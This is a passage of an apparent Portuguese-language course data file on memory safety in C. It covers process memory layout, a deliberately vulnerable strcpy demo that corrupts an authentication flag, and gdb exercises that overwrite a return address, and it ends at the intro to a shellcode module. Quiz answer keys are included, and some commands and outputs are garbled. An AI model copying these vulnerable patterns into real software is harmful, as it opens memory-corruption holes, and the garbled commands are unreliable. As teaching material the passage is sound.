          'Adiciona um canário de pilha que aborta o programa se o overflow destruí-lo',
          'Impede qualquer warning do compilador',
          'Remove a pilha da memória',
          'Impede o uso de ponteiros',
        ],
        correta: 0,
        explicacao: 'O canário é um valor aleatório colocado antes do return address; corrompê-lo (overflow) é detectado e o processo aborta.',
      },
      {
        pergunta: 'Por que strncpy(dest, src, n) sozinho não é considerado seguro?',
        opcoes: [
          'Porque ele não garante o \'\\0\' final se src for maior ou igual a n',
          'Porque ele é mais lento que strcpy',
          'Porque ele limita demais o destino',
          'Porque ele só funciona em arquivos',
        ],
        correta: 0,
        explicacao: 'strncpy não termina a string quando o tamanho de src >= n; o padrão é usar n-1 e forçar dest[n-1] = 0.',
      },
      {
        pergunta: 'O que é TOCTOU?',
        opcoes: [
          'Uma classe de bug que ocorre quando o estado muda entre a verificação e o uso (check-to-use não atômico)',
          'Um tipo de buffer na pilha',
          'Um protocolo de rede seguro',
          'Um compilador alternativo',
        ],
        correta: 0,
        explicacao: 'TOCTOU = Time-Of-Check To Time-Of-Use: verificou, e depois o mundo mudou antes do uso.',
      },
    ],
    projeto: {
      titulo: 'Mini-biblioteca strsafe',
      descricao:
        'Escreva <code>strsafe.h/.c</code> com três funções defensivas: (1) <code>strs_copiar(dest, n, src)</code>, (2) <code>strs_anexar(dest, n, src)</code> e (3) <code>strs_escrever(dest, n, fmt, …)</code> (wrapper de vsnprintf). Todas garantem NUL final e retornam <code>-1</code> em truncamento (com errno = ENAMETOOLONG se quiser sofisticar). Depois escreva um teste main que tenta estourar cada função com entradas de 10x o tamanho do buffer e comprove: nada estoura, tudo termina em 0. Compile o projeto com as flags defensivas da seção.',
      criterios: [
        'As três funções aceitam (destino, tamanho, fonte/args) — o tamanho do alvo é sempre explícito.',
        'Nenhuma função usa gets/strcpy/strcat/sprintf sem limite.',
        'Compila com o combo defensivo sem warnings: <code>gcc -Wall -Wextra -Wformat-security -Werror=format-security -fstack-protector-all</code>.',
        'O teste com entradas gigantes não gera nenhum estouro (ASan silencioso no WSL ou valgrind limpo).',
        'Cada função retorna uma indicação (0 ok / -1 truncou).',
      ],
    },
  },
  {
    trilha: '4',
    numero: '03',
    titulo: 'Anatomia da memória de um processo',
    subtitulo: 'text/data/bss/heap/stack, stack frames, endianness e endereços virtuais',
    objetivo:
      'Entender a memória como o atacante a enxerga: layout de um processo Linux (texto, dados, heap, pilha), endereços virtuais, organização de um stack frame (return address, base pointer, variáveis locais), heap, endianness e alinhamento — e por que isso faz o buffer overflow "funcionar aqui".',
    prerequisitos: 'T2.05 (ponteiros e strings), T2.06 (memória dinâmica), T0.01',
    duracao: '~45 min',
    nivel: 'Intermediário/Cyber',
    leitura: {
      beej: 'Capítulo 5, seções 5.1–5.9 (Memory and Variables)',
      king: 'Capítulo 11 (Pointers): seções sobre endereços e aritmética',
      foco:
        'No Beej, foque em "pointers are addresses" e no mapa de memória. Para a pilha, leia um artigo de referência sobre o call stack (procure "x86-64 stack frame layout" ou a seção do gdb manual sobre stack frames). Entenda o diagrama do stack frame ANTES de ir ao módulo 05.',
    },
    secoes: [
      {
        titulo: 'Mapa de memória de um processo Linux',
        rotulo: 'mapa de memoria',
        paragrafos: [
          'Todo processo Linux enxerga um espaço de endereços <strong>virtual</strong> (por processo, privado). Regiões típicas, da mais baixa para a mais alta:',
        ],
        codigo: `endereco alto
+--------------------------------------------------+
| pilha (stack)          <- cresce para BAIXO      |  enderecos altos (0x7fff...)
+--------------------------------------------------+
| ... espaco                                   ... |
+--------------------------------------------------+
|   memoria mapeada por mmap (bibliotecas, etc.)  |  ~0x7f...
+--------------------------------------------------+
| heap (malloc)           -> cresce para CIMA      |  logo acima do data
+--------------------------------------------------+
| bss  (globais zeradas, nao inicializadas)        |
| data (globais inicializadas)                     |
+--------------------------------------------------+
| texto (codigo da funcao)                         |  endereco baixo (0x4... )
endereco baixo`,
        lista: [
          '<strong>text</strong> — as instruções da CPU (seu código compilado). Geralmente read-only + execute.',
          '<strong>data / bss</strong> — variáveis globais. <em>data</em> guarda as inicializadas (ex.: <code>int x = 7</code>); <em>bss</em> guarda as zeradas por padrão (ex.: <code>int y;</code>).',
          '<strong>heap</strong> — memória dinâmica (<code>malloc</code>/<code>free</code>), cresce para cima.',
          '<strong>stack</strong> — chamadas de função e variáveis locais, cresce para baixo (endereços decrescentes).',
          '<code>mmap</code> — mapeamentos de bibliotecas compartilhadas (libc, ld) e região de threads; fica entre o heap e a pilha.',
        ],
      },
      {
        titulo: 'Imprimindo endereços de cada região',
        rotulo: 'addr.c',
        paragrafos: [
          'O programa abaixo imprime o endereço de uma variável em cada região. <strong>ASLR</strong> (Address Space Layout Randomization) embaralha pila/heap/bibliotecas por execução, então os números mudam a cada <code>./addr</code> — mas a <em>ordem relativa</em> é sempre a mesma. Compare a pilha de <code>main</code> com a de <code>funcao</code>: a de dentro fica <strong>abaixo</strong> (menor endereço), porque a pilha cresce para baixo.',
        ],
        codigo: `/* addr.c -- imprime enderecos de cada regiao de memoria.
   gcc -Wall -Wextra -std=c11 addr.c -o addr   (Linux/WSL; roda tambem no MinGW) */
#include <stdio.h>
#include <stdlib.h>

int global_inicializado = 7;   /* data  */
int global_zerado;             /* bss   */

static void funcao(void)
{
    char tela_local[8];        /* pilha, dentro de outra frame */
    printf("    pilha (local de funcao)  : %p\\n", (void *)tela_local);
}

int main(void)
{
    char  na_pilha[8];         /* pilha */
    int   numero = 42;         /* pilha */
    char *no_heap = malloc(64);/* heap  */

    printf("  texto (main)                : %p\\n", (void *)main);
    printf("  data  (global init)         : %p\\n", (void *)&global_inicializado);
    printf("  bss   (global zerada)       : %p\\n", (void *)&global_zerado);
    printf("  heap  (malloc)              : %p\\n", (void *)no_heap);
    printf("  pilha (local de main)       : %p\\n", (void *)na_pilha);
    printf("  pilha (var numero)          : %p\\n", (void *)&numero);
    funcao();

    free(no_heap);
    return 0;
}`,
        saida: `$ ./addr
  texto (main)                : 0x401126
  data  (global init)         : 0x404010
  bss   (global zerada)       : 0x404028
  heap  (malloc)              : 0x90f2a0
  pilha (local de main)       : 0x7ffe2f4f0c20
  pilha (var numero)          : 0x7ffe2f4f0c1c
    pilha (local de funcao)  : 0x7ffe2f4f0bf0`,
      },
      {
        titulo: 'O stack frame: a estrutura que o atacante estuda',
        rotulo: 'stack frame',
        paragrafos: [
          'Quando uma função é chamada, a CPU monta um <strong>frame</strong> (moldura) na pilha. No x86-64 (ABI System V), o frame típico contém, do endereço mais alto para o mais baixo:',
        ],
        lista: [
          'Os <strong>argumentos de entrada</strong> (ou registradores salvos) do chamador.',
          'O <strong>return address</strong> — endereço da próxima instrução no chamador, empurrado pela instrução <code>call</code>. É o "bilhete de volta".',
          'O <strong>saved frame pointer</strong> (RBP anterior) — usado para restaurar a pilha ao retornar.',
          'As <strong>variáveis locais</strong> da função (os buffers!).',
          '<strong>Área de temporários</strong> / espaço para salvar registradores, se necessário.',
        ],
        codigo: `enderecos altos
  +----------------------------+
  | args / copia do chamador   |
  | return address  <-- EIP/RIP volta pra ca      |
  | saved RBP                  |
  | variaveis locais (buf[])   |  <-- onde estoura o overflow
  | temporarios                |
enderecos baixos (RSP aponta pra ca)
  "A pilha cresce PARA BAIXO. Um overflow escrita-para-cima
   em buf[] caminha em direcao ao saved RBP e ao return address."`,
      },
      {
        titulo: 'O heap e o motivo de "estourou aqui, corrompeu ali"',
        paragrafos: [
          'O heap é gerenciado pelo <em>allocator</em> da glibc. Cada bloco <code>malloc</code> tem um <strong>cabeçalho (metadata)</strong> logo antes do ponteiro que você recebe. Por isso, escrever além do bloco com <code>strcpy</code>/<code>memcpy</code> corrompe o cabeçalho do bloco vizinho, e o <code>free</code> subsequente pode fazer o programa quebrar ou executar código (veremos a teoria no módulo 08). Do lado do programa, a lição imediata é: <strong>heap overflow corrompe estrutura que o programa não vê</strong>.',
        ],
      },
      {
        titulo: 'Endianness: como o CPU lê seus bytes',
        rotulo: 'endian.c',
        paragrafos: [
          'O x86 (Intel/AMD) é <strong>little-endian</strong>: o byte menos significativo fica no endereço mais baixo. Isso importa muito em exploração, porque o atacante monta endereços "de trás para frente" no payload (no 32-bit, <code>0xbffff5a0</code> vira os bytes <code>a0 f5 ff bf</code>).',
        ],
        codigo: `/* endian.c -- mostra a ordem dos bytes de um int em memoria.
   gcc -Wall -Wextra -std=c11 endian.c -o endian   (qualquer SO) */
#include <stdio.h>
#include <string.h>

int main(void)
{
    unsigned char bytes[4];
    unsigned int x = 0x11223344;

    memcpy(bytes, &x, sizeof x);
    printf("0x11223344 em memoria: %02x %02x %02x %02x\\n",
           bytes[0], bytes[1], bytes[2], bytes[3]);
    if (bytes[0] == 0x44)
        printf("little-endian (byte menos significativo primeiro)\\n");
    else
        printf("big-endian\\n");
    return 0;
}`,
        saida: `$ ./endian
0x11223344 em memoria: 44 33 22 11
little-endian (byte menos significativo primeiro)`,
      },
      {
        titulo: 'Alinhamento (resumo prático)',
        paragrafos: [
          'O compilador posiciona variáveis em endereços <em>alinhados ao tamanho</em> (um <code>int</code> costuma ser alinhado a 4, um <code>long</code> a 8). Consequências práticas: (1) <code>sizeof(struct)</code> pode ser maior que a soma dos campos (padding) — um dos motivos de "reservar 20 bytes" e conseguir mais; (2) na pilha, entre um buffer e o return address pode existir padding, o que muda o <em>offset</em> no exploit. No módulo 05 você vai calcular esse offset experimentalmente no gdb, e não no chute.',
        ],
      },
      {
        titulo: 'Por que o buffer overflow "funciona aqui"',
        rotulo: 'corromper uma variavel vizinha',
        paragrafos: [
          'Junte tudo: local variáveis ficam na pilha; um <code>strcpy</code> sem limite escreve <strong>para cima</strong> (endereços crescentes); acima do buffer na frame estão (possivelmente) outras locais, o saved RBP e o return address. Se o atacante controla o overflow, controla o fluxo do programa. Demonstração simples — estourar <code>segredo[8]</code> e corromper o <code>autenticado</code> que veio depois na stack frame:',
        ],
        codigo: `/* corrupcao.c -- estouro que muda o valor de uma variavel vizinha.
   gcc -Wall -Wextra -std=c11 corrupcao.c -o corrupcao
   *o layout exato depende do compilador; rode o seu */
#include <stdio.h>
#include <string.h>

int main(void)
{
    char segredo[8] = "????";
    int  autenticado = 0;

    /* 20 'A' nao cabem em 8: transbordam na pilha */
    strcpy(segredo, "AAAAAAAAAAAAAAAAAAAA");

    if (autenticado == 0)
        printf("NAO autenticado\\n");
    else
        printf("AUTENTICADO por corrupcao de memoria!\\n");

    printf("autenticado = %d (0x%x)\\n", autenticado, autenticado);
    return 0;
}`,
        saida: `$ ./corrupcao
AUTENTICADO por corrupcao de memoria!
autenticado = 1094795585 (0x41414141)
(no Windows/MinGW o CRT ainda reporta um aviso de runtime ("runtime error"),
 mas a corrupcao e a mesma; no Linux/glibc a saida e so a das duas linhas. A
 nota serve para voce nao estranhar a diferenca de saida entre sistemas.)`,
      },
      {
        titulo: 'Como se defender',
        lista: [
          'Assuma que o layout da pilha pode mudar (compilador, otimização, sistema) — nenhum código real pode depender de "buffer X fica logo abaixo do Y".',
          'Tudo que é <em>local</em> e <em>recebe cópia sem limite</em> é estourável: use sempre cópias com tamanho (módulo 02).',
          'Endereços sensíveis (return address, metadados de heap, ponteiros) ficam a poucos bytes de qualquer overflow: proteja-os com canário (<code>-fstack-protector</code>) e nunca deixe seu buffer ser atingível por entrada externa sem sanitização.',
          'Entender endianness evita suposições erradas ao ler dump de memória: 44 33 22 11 é 0x11223344 em little-endian, não "44 milhões".',
          'Use <code>checksec</code> (no pwndbg: <code>checksec</code>) em binários reais para saber o que está ativo antes de decidir como defender.',
          'Essa anatomia também é a base defensiva: para ler um crash/panik (kernel), você precisa ler a pilha do mesmo jeito.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 2,
        enunciado:
          'Compile e rode <code>addr.c</code> três vezes. Anote os endereços de heap, pilha e main em cada rodada. O que muda por execução? O que permanece estável? Por quê?',
        dica: 'Lembre-se da ASLR: a pilha é randomizada por execução; se o binário foi compilado como PIE (padrão), main também muda.',
        solucao: `$ ./addr   # execucao 1
...
$ ./addr   # execucao 2
...
$ ./addr   # execucao 3
...
# Obs.: enderecos de heap/pilha/main mudam a cada execucao
# por causa da ASLR (Linux randomiza espaco de enderecos por
# processo). A ordem (text < data < bss < heap < pilha) e
# sempre a mesma. Se main nao mudar, veja se o binario foi
# compilado com -no-pie.`,
      },
      {
        nivel: 2,
        enunciado:
          'Rode <code>corrupcao.c</code>, depois recompile com <code>-fstack-protector-all</code> e rode de novo. A saída muda? Explique o que o stack protector fez (ou deixou de fazer) neste exemplo.',
        dica: 'O canário protege o return address, não necessariamente variáveis vizinhas no mesmo frame. Note qual valor foi corrompido em cada caso.',
        solucao: `$ gcc -Wall -Wextra -std=c11 corrupcao.c -o corrupcao
$ ./corrupcao
AUTENTICADO por corrupcao de memoria!
autenticado = 1094795585 (0x41414141)
$ gcc -Wall -Wextra -std=c11 -fstack-protector-all corrupcao.c -o corrupcao_sp
$ ./corrupcao_sp
AUTENTICADO por corrupcao de memoria!
autenticado = 1094795585 (0x41414141)`,
        solucao_obs: 'Neste caso o canário não impediu, porque o autenticado é variável local do mesmo frame e a corrupção não tocou o canário nem o return address. Lição: stack protector não é pára-choque de toda corrupção — a defesa primária continua sendo não estourar o buffer.',
      },
      {
        nivel: 3,
        enunciado:
          'Modifique <code>corrupcao.c</code> para que o overflow caminhe até o <em>return address</em>: aumente o payload (ex.: 40-50 A) e observe no gdb (<code>info registers rbp rip</code>) onde os "A" param. O programa deve dar segfault com invalid return address.',
        dica: 'Compile com <code>-g -fno-stack-protector</code>, coloque breakpoint no <code>printf</code> final e olhe <code>x/16x mapem? no, $rsp</code>.',
        solucao: `$ gcc -g -fno-stack-protector -Wall -Wextra -std=c11 corrupcao.c -o corrupcao_g
$ gdb ./corrupcao_g
(gdb) break 20
(gdb) run
(gdb) x/16x $rsp
...0x41414141.. aparece nos bytes logo apos o buffer...
(gdb) continue
Program received signal SIGSEGV, Segmentation fault.`,
        solucao_obs: 'O segfault é o indício de que o ret tocado: RIP virou 0x41414141. Esse caminho é exatamente o que o módulo 05 explora de forma controlada.',
      },
    ],
    quiz: [
      {
        pergunta: 'Qual região da memória guarda variáveis locais e o return address?',
        opcoes: ['Heap', 'Stack (pilha)', 'BSS', 'Texto'],
        correta: 1,
        explicacao: 'Variáveis locais e informações de chamada (return address) ficam na pilha, que cresce para baixo.',
      },
      {
        pergunta: 'Em um stack frame típico, o que fica entre as variáveis locais e o return address?',
        opcoes: [
          'O saved frame pointer (RBP anterior)',
          'O endereço base do heap',
          'A tabela de páginas',
          'O primeiro byte do buffer',
        ],
        correta: 0,
        explicacao: 'Acima das locais vem o saved RBP e depois o return address — é essa "faixa" que o overflow escala.',
      },
      {
        pergunta: 'Em uma máquina little-endian, o inteiro 0x11223344 aparece na memória como:',
        opcoes: ['44 33 22 11', '11 22 33 44', '44 44 44 44', '11 33 22 44'],
        correta: 0,
        explicacao: 'Little-endian grava o byte menos significativo primeiro (44 no endereço mais baixo).',
      },
      {
        pergunta: 'Por que a pilha de funcao() fica em endereço MENOR que a pilha de main() no exemplo addr.c?',
        opcoes: [
          'Porque a pilha cresce para baixo, e a frame de quem chamou fica acima',
          'Porque malloc sempre aloca primeiro',
          'Porque main é declarada antes',
          'Porque o compilador ordena por ordem alfabética',
        ],
        correta: 0,
        explicacao: 'Cada call empurra a nova frame para endereços mais baixos; o chamador (main) permanece em endereço maior.',
      },
    ],
    projeto: {
      titulo: 'Poster da memória de um processo',
      descricao:
        'Crie um arquivo <code>memoria.md</code> na pasta <code>~/labs/4.03</code> com um diagrama ASCII do mapa de memória (texto, data, bss, heap, mmap, pilha), e ao lado uma explicação do stack frame (args, return address, saved RBP, locais, temporários) com um exemplo de endereço real tirado do seu <code>addr.c</code>. Inclua também o resultado do exercício de endianness e um parágrafo "onde o buffer overflow atua" ligando os dois conceitos.',
      criterios: [
        'Diagrama com as 5-6 regiões e seta de crescimento de cada uma.',
        'Desenho do stack frame com os 4-5 campos e indicação de onde o overflow escala.',
        'Um endereço real de cada região copiado da saída do addr.c.',
        'Explicação correta do 44 33 22 11 (little-endian).',
      ],
    },
  },
  {
    trilha: '4',
    numero: '04',
    titulo: 'Ferramentas de análise: gdb, objdump, readelf, strings e strace',
    subtitulo: 'Instrumentar binários, ler assembly e rastrear syscalls',
    objetivo:
      'Dominar o conjunto de ferramentas do analista de binários: gdb a fundo (breakpoints, examinar memória/registradores, disassembly, watchpoints, find), peda/pwndbg, objdump (-d/-s), readelf, strings e strace — para dissecar um binário C compilado com -g e identificar seus frames e dados.',
    prerequisitos: 'T0.01 (gdb básico), T4.03 (anatomia da memória)',
    duracao: '~45 min',
    nivel: 'Avançado/Cyber',
    leitura: {
      foco:
        'Leia o manual do gdb (<code>info gdb</code> ou https://sourceware.org/gdb/current/onlinedocs/gdb/) com foco em "Examining Memory" e "Examining Data". Para o assembly, consulte a referência de instruções do System V AMD64 ABI e o README do pwndbg (https://github.com/pwndbg/pwndbg). A prática do módulo vale mais que a leitura: rode cada comando no seu binário.',
    },
    secoes: [
      {
        titulo: 'O binário de estudo (compilado para análise)',
        rotulo: 'analise.c',
        paragrafos: [
          'Vamos trabalhar com um programa trivial compilado de forma a deixar o assembly didático: <code>-g</code> (símbolos), <code>-fno-stack-protector</code> e <code>-no-pie</code> (sem randomização do binário — endereços estáveis, mais fácil de acompanhar). <strong>Não use estes flags em código real</strong>: aqui são só para estudo. Este módulo roda inteiro no Linux/WSL (no MinGW o gdb é outra história); segue o programa:',
        ],
        codigo: `/* analise.c -- alvo de estudo das ferramentas.
   gcc -g -fno-stack-protector -no-pie -Wall -Wextra analise.c -o analise */
#include <stdio.h>

static int soma(int a, int b)
{
    return a + b;
}

static void processa(const char *dado)
{
    char buf[16];
    snprintf(buf, sizeof buf, "%s", dado);
    puts(buf);
    (void) soma(2, 3);
}

int main(void)
{
    processa("reconhecimento");
    return 0;
}`,
        saida: `$ gcc -g -fno-stack-protector -no-pie -Wall -Wextra analise.c -o analise
$ ./analise
reconhecimento`,
      },
      {
        titulo: 'gdb: breakpoints, stepping por instrução e registradores',
        rotulo: 'sessao gdb basica',
        paragrafos: [
          'O gdb é o microscópio. Os comandos desta seção cobrem 90% do uso em exploração:',
        ],
        lista: [
          '<code>break N</code> ou <code>break processa</code> — pausa na linha N ou no início da função.',
          '<code>info registers</code> (curto: <code>i r</code>) — mostra todos os registradores (RIP, RSP, RBP, RAX…).',
          '<code>x/20x $rsp</code> — examina 20 words hexa a partir de RSP; <code>x/20wx</code> força 4 bytes/word, <code>x/10gx</code> 8 bytes. É o "x-ray" da pilha.',
          '<code>x/20xb $rsp</code> — bytes avulsos (essencial para ver payload/thancle endianness).',
          '<code>nexti</code> (ni) — executa UMA instrução de máquina; <code>next</code> (n) executa uma linha de C. <code>stepi</code> (si) entra em calls, <code>ni</code> não.',
          '<code>disas</code> (disassemble) — mostra o assembly da função atual; <code>disas processa</code> de qualquer função.',
          '<code>watch var</code> — para a execução quando a variável mudar de valor (watchpoint).',
          '<code>find /b 0x400000, 0x410000, 0x44, 0x45, 0x41</code> — procura uma sequência de bytes num intervalo de endereços.',
        ],
        codigo: `gdb ./analise
(gdb) break processa
(gdb) run
(gdb) info registers rsp rbp rip
(gdb) disas
(gdb) x/16wx $rsp            # a frame inteira na tela
(gdb) ni
(gdb) ni
(gdb) info registers rip     # RIP avancou 2 instrucoes
(gdb) continue
(gdb) quit`,
        saida: `Breakpoint 1, processa (dado=0x7fffffffe3e0 "reconhecimento") at analise.c:9
9         char buf[16];
(gdb) info registers rsp rbp rip
rsp            0x7fffffffe3b0      0x7fffffffe3b0
rbp            0x7fffffffe3c0      0x7fffffffe3c0
rip            0x4011b0            0x4011b0 <processa>
(gdb) disas
Dump of assembler code for function processa:
   0x00000000004011b0 <+0>:     push   %rbp
   0x00000000004011b1 <+1>:     mov    %rsp,%rbp
   0x00000000004011b4 <+4>:     sub    $0x20,%rsp
   ...
   0x00000000004011d3 <+35>:    leave
   0x00000000004011d4 <+36>:    ret
End of assembler dump.`,
      },
      {
        titulo: 'Encontrando o return address e o offset da frame',
        rotulo: 'marcando a pilha',
        paragrafos: [
          'Técnica valiosa para os próximos módulos: <strong>marcar a pilha com um padrão</strong> e ler onde ele aparece. No gdb, escreva em memória uma marca e depois veja em que offset do buffer ela cai. Passo a passo (parada em <code>processa</code> após os locals):',
        ],
        codigo: `(gdb) break *processa+4        # apos sub $0x20 (frame montada)
(gdb) run
(gdb) set {long} $rsp = 0x4142434445464748   # "HGFEDCBA"
(gdb) x/8gx $rsp
0x7fffffffe3b0: 0x4142434445464748  0x0000000000000000
0x7fffffffe3c0: 0x0000000000000000  0x0000000000000000
0x7fffffffe3d0: 0x0000000000000000  0x00000000004011dd
                                          ^^^^^^^^^^ return address p/ main
(gdb) quit`,
      },
      {
        titulo: 'peda e pwndbg: o gdb turbinado',
        paragrafos: [
          'Pedra e pwndbg são plugins do gdb que desenham a pilha, destacam o return address, decodificam endereços (text vs libc) e trazem comandos prontos. Com o pwndbg (preferido aqui):',
        ],
        lista: [
          '<code>checksec</code> — mostra NX, PIE, canário, RELRO do binário carregado (o "checar blindagens" de cada exploração).',
          '<code>cyclic 100</code> (pwntools) — gera padrão para achar offset exato; <code>cyclic -l 0x61616164</code> devolve o offset.',
          '<code>canary</code> — tenta mostrar o canário da thread atual (módulos 06).',
          '<code>stack N</code> — imprime N words da pilha com anotações; <code>regs</code> lista registradores em colunas.',
          'O realce automático: o return address aparece na pilha com cor/rotulo "ret addr" — economiza horas de x/20x.',
        ],
        codigo: `$ gdb ./analise
pwndbg> checksec
    Arch: amd64-64-little
    RELRO: Partial RELRO
    Stack: No canary found
    NX: NX enabled
    PIE: No PIE (0x400000)
pwndbg> break processa
pwndbg> run
pwndbg> stack 12
00:0000│ rsp 0x7fffffffe3b0 ◂— 0x0
04:0020│     0x7fffffffe3d0 ◂— 0x4011dd  /* ret addr para main+0x14 */
...`,
      },
      {
        titulo: 'objdump: o assembly sem executar',
        rotulo: 'objdump e readelf',
        paragrafos: [
          'Para "ler" o binário sem abrir o gdb, o objdump desconstrói o arquivo:',
        ],
        lista: [
          '<code>objdump -d analise</code> — desmonta o <em>código</em> de todas as funções para assembly (Intel com <code>-M intel</code>).',
          '<code>objdump -d -M intel analise | grep -A25 "&lt;processa&gt;"</code> — só a função processa.',
          '<code>objdump -s -j .rodata analise</code> — hexdump da seção de constantes (strings literais do seu programa).',
          '<code>objdump -t analise</code> — tabela de símbolos (funções e endereços).',
        ],
        codigo: `$ objdump -d -M intel analise | grep -A25 "<processa>:"
<processa>:
   push   rbp
   mov    rbp,rsp
   sub    rsp,0x20
   lea    rax,[rip+0x2e9b]     # "reconhecimento"
   mov    rsi,rax
   mov    edi,0x20
   call   ...
   ...
$ readelf -h analise          # cabecalho ELF (tipo, entradas...)
$ readelf -S analise          # tabela de secoes (.text, .data, .rodata...)
$ readelf -s analise | grep -E "processa|main|soma"   # simbolos`,
      },
      {
        titulo: 'strings e strace: pistas e comportamento',
        rotulo: 'strings e strace',
        paragrafos: [
          'Duas ferramentas rápidas de inteligência:',
        ],
        lista: [
          '<code>strings binario</code> — extrai todas as sequências de texto; <code>strings -n 8</code> ignora as curtas. Em CTFs, o <code>strings</code> muitas vezes entrega a "flag" ou mensagens escondidas; em análise, revela mensagens de erro e paths que desenham o comportamento.',
          '<code>strace -f ./analise</code> — registra cada <em>syscall</em> (read, write, mmap, execve, connect): mostra com que o programa fala, quando e com quais argumentos. Útil para perceber chamadas suspeitas (ex.: uma conexão de saída).',
        ],
        codigo: `$ strings analise | head
/lib64/ld-linux-x86-64.so.2
reconhecimento
...
$ strace ./analise 2>&1 | tail -20
execve("./analise", ...) = 0
brk(NULL) ...
write(1, "reconhecimento\\n", 15) = 15
exit_group(0)`,
      },
      {
        titulo: 'Como se defender',
        lista: [
          'Use as mesmas ferramentas do atacante na sua defesa: <code>checksec</code> para confirmar que canário/NX/PIE/RELRO estão ativos no binário que você publica.',
          'Leia o assembly do seu próprio código compilado com <code>-O2</code> para confirmar que o compilador não introduziu chamadas estranhas (ou que suas funções de string segura não viraram código quente demais).',
          'Rode <code>strace</code> em serviços próprios para auditar "com o que este processo conversa" (devem ser só os peers esperados).',
          'Em incidentes, capture o core dump (ulimit -c) e analise com gdb: a pilha do crash é a primeira pista da causa raiz — exatamente como você aprendeu a "sentir" a pilha aqui.',
          'Binários de produção devem passar por <code>gvim readelf -d</code> para checar dependências e por valgrind/ASan em testes.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 2,
        enunciado:
          'Compile <code>analise.c</code> com <code>-g -fno-stack-protector -no-pie</code> e, no gdb, coloque breakpoint em <code>processa</code>. Imprima <code>info registers rbp rip</code>, depois <code>x/20x $rsp</code> e <code>x/1gi $rip</code>. Identifique o return address na pilha (o ponteiro que aponta para a instrução seguinte ao call em main).',
        dica: 'Monte a frame (Pressione <code>run</code> para parar no break; dê <code>ni</code> umas 3 vezes). A pilha é little-endian: o ret vem em gx com os bytes na ordem inversa.',
        solucao: `$ gdb ./analise
(gdb) break processa
(gdb) run
(gdb) i r rbp rip
rbp            0x7fffffffe3c0      0x7fffffffe3c0
rip            0x4011b0            0x4011b0 <processa>
(gdb) x/20x $rsp
0x7fffffffe3b0: ... ...
(gdb) x/1i $rip
=> 0x4011b0 <processa>: push %rbp`,
        solucao_obs: 'O ret addr fica no endereço rbp+8: <code>x/gx $rbp+8</code>. Na dúvida, siga o endereço retornado com <code>x/3i</code> para conferir que é código de main.',
      },
      {
        nivel: 3,
        enunciado:
          'Use o gdb para quebrar em um campo específico da frame: pare em <code>processa</code>, avance 4 instruções (<code>ni</code> 4x), escreva o valor <code>0x41</code> (quatro A) em <code>$rbp+8</code> (<code>set {long} $rbp+8 = 0x41414141</code>) e <code>continue</code>. O que acontece? Explique por que o gdb reporta o que reporta.',
        dica: 'Ao dar <code>leave; ret</code>, a CPU vai pular para 0x41414141 — fora do mapa do processo.',
        solucao: `(gdb) ni 4
(gdb) set {long} $rbp+8 = 0x41414141
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x0000000000414143 in ?? ()
Cannot access memory at address 0x41414141`,
        solucao_obs: 'RIP tentou ir para 0x41414141 (little-endian) e o kernel abortou. Isso é literalmente o que o módulo 05 fará com um endereço de verdade.',
      },
      {
        nivel: 2,
        enunciado:
          'Com o objdump, liste o assembly completo de <code>main</code> e de <code>processa</code>. Identifique no main a instrução <code>call</code> que invoca processa e o endereço da instrução seguinte (o ret address). Confirme com <code>objdump -t</code> os endereços das três funções.',
        dica: 'No assembly Intel: o <code>call</code> aparece seguido do <code>leave/ret</code>; o endereço apontado pelo <code>RIP</code> após o call é o ret address.',
        solucao: `$ objdump -d -M intel analise | sed -n '/<main>:/,/<_fini>:/p'
00000000004011e0 <main>:
   ...
  call   4011b0 <processa>
   ...
  call   401160 <soma+0x...>   # ver simbolos
$ objdump -t analise | grep -E " main| processa| soma"`,
      },
    ],
    quiz: [
      {
        pergunta: 'Qual comando do gdb imprime 20 words (4 bytes) da pilha a partir de RSP?',
        opcoes: ['x/20wx $rsp', 'print 20 $rsp', 'dump stack 20', 'stack/20'],
        correta: 0,
        explicacao: 'x/conta+formato+unidade: x/20wx = 20 words hex horizontais a partir de $rsp.',
      },
      {
        pergunta: 'Qual a diferença entre next (n) e nexti (ni) no gdb?',
        opcoes: [
          'n executa uma linha de C; ni executa uma única instrução de máquina',
          'n executa instruções e ni linhas',
          'n pula funções e i entra nelas',
          'n é mais rápido porque não mostra assembly',
        ],
        correta: 0,
        explicacao: 'n (next) anda a nível de código-fonte; ni (nexti) anda a nível de assembly — essencial em exploração.',
      },
      {
        pergunta: 'Para que serve o checksec dentro do pwndbg?',
        opcoes: [
          'Mostrar quais proteções o binário tem (NX, PIE, canário, RELRO)',
          'Verificar se o binário é um vírus',
          'Comparar dois binários',
          'Desmontar o binário em assembly',
        ],
        correta: 0,
        explicacao: 'checksec resume stack canary, NX, PIE e RELRO do binário carregado.',
      },
      {
        pergunta: 'O que strace mostra?',
        opcoes: [
          'Cada chamada de sistema feita pelo processo, com argumentos',
          'As strings escondidas do binário',
          'O histórico de compilação',
          'A tabela de páginas da memória',
        ],
        correta: 0,
        explicacao: 'strace interpõe e registra syscalls (read, write, connect, mmap…) — o que o processo "conversa" com o kernel.',
      },
    ],
    projeto: {
      titulo: 'Cartão de análise de um binário',
      descricao:
        'Compile o <code>analise.c</code> com flags reais (<code>-O2 -fstack-protector-all -pie</code>) e com o flag de estudo (<code>-O0 -fno-stack-protector -no-pie</code>), e monte um cartão comparativo em markdown: para cada binário registre (a) checksec (NX, PIE, canário, RELRO), (b) endereço de <code>main</code> e de <code>processa</code> no objdump -t, (c) o endereço do buffer dentro de processa em 2 execuções (mudou? por quê?), (d) se o return address está a offset fixo do buffer. Feche com a pergunta: "em qual dos dois binários um overflow de buffer controlaria o fluxo com mais facilidade?"',
      criterios: [
        'Dois cartões (um por build) com NX/PIE/canário/RELRO registrados.',
        'Endereços de main/processa e do buffer, com a variação (ou não) entre execuções explicada.',
        'Offset buffer→return address medido no gdb.',
        'Conclusão comparando a dificuldade de exploração nas duas builds.',
      ],
    },
  },
  {
    trilha: '4',
    numero: '05',
    titulo: 'Buffer overflow clássico (stack): ret2shellcode em 32 bits',
    subtitulo: 'Do offset ao EIP: compilar vulnerável, gerar payload e obter shell',
    objetivo:
      'Reproduzir, num laboratório isolado e em um binário criado por você, o ataque mais clássico da história: estouro de buffer na pilha para sequestrar o EIP e executar shellcode (execve /bin/sh). Inclui: frame 32-bit, cálculo do offset, NOP sled, shellcode, geração do payload em python e condições de compilação didáticas, sempre em WSL2/VM com ASLR desligado por sessão.',
